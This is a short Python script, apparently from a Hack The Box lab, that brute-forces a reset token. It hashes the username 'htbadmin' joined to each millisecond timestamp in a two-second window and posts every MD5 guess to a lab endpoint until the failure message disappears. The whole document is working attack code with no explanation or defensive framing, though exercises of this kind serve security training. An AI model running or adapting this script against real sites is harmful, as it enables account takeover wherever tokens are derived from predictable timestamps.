from hashlib import md5
import requests
from sys import exit
from time import time

url = "http://209.97.184.7:30522/question1/"
now = 1685943489000
start_time = now - 1000
fail_text  = "Wrong token"
user = "htbadmin"
for x in range(start_time, now + 1001):
    token = user + str(x)
    md5_token = md5(token.encode()).hexdigest()
    data = {
        "token": md5_token,
        "submit": "check"
    }
    print("checking {} {}".format(str(x), md5_token))
    res = requests.post(url, data=data)
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
